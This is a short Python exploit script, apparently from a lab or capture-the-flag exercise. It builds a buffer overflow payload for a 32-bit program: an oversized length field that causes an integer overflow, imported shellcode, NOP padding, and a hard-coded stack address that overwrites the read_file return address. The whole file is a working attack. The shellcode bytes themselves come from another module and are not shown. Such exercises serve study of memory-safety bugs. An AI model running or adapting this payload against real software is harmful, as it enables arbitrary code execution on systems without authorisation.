#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

'''directly overwrite read_file return address to shellcode address'''
'''need to find shell code start address manually %ebp-x (increase x from 0x10 to ...)'''

BUFFER_SIZE = 0xffffffff                    # buffer size (create integer overflow)
READ_FILE_EBP = 0xfffed298                  # read_file %ebp
ADDR_DIFF = 0x28                            # %ebp - buf start address      (40-byte)
SHELL_CODE_ADDR = READ_FILE_EBP-ADDR_DIFF   # shell code start address      (buf start address)
READ_FILE_FP_SIZE = 0x04                    # read_file frame pointer size  (4-byte)
SHELL_CODE_SIZE = 0x17                      # shell code size               (23-byte)

sys.stdout.buffer.write(pack('<I',BUFFER_SIZE)+shellcode+b'\x90'*(ADDR_DIFF+READ_FILE_FP_SIZE-SHELL_CODE_SIZE)+pack('<I',SHELL_CODE_ADDR))